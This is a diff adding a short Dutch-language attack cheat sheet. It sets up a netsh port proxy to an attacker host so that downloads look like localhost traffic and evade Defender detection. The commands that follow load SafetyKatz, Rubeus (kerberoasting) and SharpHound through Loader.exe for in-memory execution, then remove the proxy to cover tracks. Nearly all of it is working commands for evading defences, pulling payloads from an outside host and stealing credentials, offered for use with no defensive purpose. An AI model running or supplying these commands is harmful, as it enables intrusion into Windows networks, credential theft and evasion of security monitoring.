@@ -1,0 +1,30 @@
+# Port Proxy Staging — netsh portproxy voor Defender download bypass
+# Gebruik port forwarding zodat downloads van 127.0.0.1 komen (bypass behavior detection)
+
+# === Context ===
+# Defender/MDE detecteert downloads van externe IPs via certutil, wget, etc.
+# Door een port proxy in te stellen lijken downloads van localhost te komen
+
+# === Port proxy instellen ===
+# Forward 127.0.0.1:8080 → ATTACKER_IP:80
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=ATTACKER_IP
+
+# === Tools downloaden via de proxy ===
+# Nu komen downloads van 127.0.0.1 — minder verdacht
+Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::evasive-keys" "exit"
+Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args kerberoast /outfile:hashes.txt
+Loader.exe -path http://127.0.0.1:8080/SharpHound.exe -args -c All
+
+# === Controleer actieve port proxies ===
+netsh interface portproxy show all
+
+# === Port proxy verwijderen (opruimen) ===
+netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
+
+# === Alle port proxies verwijderen ===
+netsh interface portproxy reset
+
+# Noot: Vereist local admin rechten om portproxy in te stellen
+# Noot: Werkt met elke tool die HTTP gebruikt (Loader.exe, curl, Invoke-WebRequest)
+# Noot: De attacker webserver moet bereikbaar zijn op poort 80
+# Noot: Combineer met Loader.exe voor volledig in-memory execution
